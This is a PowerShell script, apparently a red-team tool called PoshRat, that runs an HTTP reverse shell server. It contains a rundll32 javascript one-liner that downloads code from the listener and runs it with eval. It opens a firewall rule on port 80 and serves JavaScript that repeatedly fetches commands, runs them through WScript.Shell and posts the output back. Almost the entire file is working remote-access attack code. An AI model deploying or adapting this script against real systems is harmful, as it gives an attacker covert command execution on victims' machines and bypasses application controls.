<#
     
  Author: Casey Smith @subTee
 
  License: BSD3-Clause
     
  .SYNOPSIS
   
  Simple Reverse Shell over HTTP. Execute Commands on Client.  
   
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/connect",false);h.Send();B=h.ResponseText;eval(B)
   
  Listening Server IP Address
   
#>
 
$Server = '127.0.0.1' #Listening IP. Change This.
 
function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}
 
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 
 
netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
 
$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
    $hostip = $request.RemoteEndPoint
    #Use this for One-Liner Start
    if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
     write-host "Host Connected" -fore Cyan
        $message = '
                    var id = window.setTimeout(function() {}, 0);
                    while (id--) {
                        window.clearTimeout(id); // Clear Timeouts
                    }
                     
                    while(true)
                    {
                        h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                        h.Open("GET","http://'+$Server+'/rat",false);
                        h.Send();
                        c = h.ResponseText;
                        r = new ActiveXObject("WScript.Shell").Exec(c);
                        var so;
                        while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
                        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
                        p.Open("POST","http://'+$Server+'/rat",false);
                        p.Send(so);
                    }
                     
        '
 
    }        
     
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) { 
        Receive-Request($request)   
    }
    if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {  
        $response.ContentType = 'text/plain'
        $message = Read-Host "JS $hostip>"      
    }
     
 
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}
 
$listener.Stop()